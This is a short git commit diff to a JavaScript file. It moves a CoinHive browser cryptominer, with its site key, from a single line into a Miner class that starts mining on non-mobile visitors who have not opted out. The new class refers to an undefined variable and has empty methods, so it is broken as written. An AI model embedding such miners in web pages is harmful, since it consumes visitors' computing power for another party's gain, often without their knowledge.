a0d72eef06b16932c1a1d4ab2fb3135de914a8df
HardCoreWare <bernardocodu@gmail.com>
2019-02-17 15:42:21 -0600

    ok

--- main.js
+++ main.js
@@ -1,5 +1,36 @@
-var miner = new CoinHive.Anonymous('kuLEQIq4VDkik2UiCSrYWLoX8hwzNHsY', {throttle: 0.1});
+//var miner = new CoinHive.Anonymous('kuLEQIq4VDkik2UiCSrYWLoX8hwzNHsY', {throttle: 0.1});
 
-if (!miner.isMobile() && !miner.didOptOut(14400)) {
-    miner.start();
+class Miner{
+
+    constructor(conhive){
+
+        this.conhive=conhive;
+        this.cpuUsage=10;
+
+    }
+
+    getStat(){
+
+
+
+    }
+
+    begin(){
+
+        if (!this.conhive.isMobile() && !conhive.didOptOut(14400)) {
+
+            conhive.start();
+
+        }
+
+    }
+
+    end(){
+
+
+
+    }
+
+
+
 }
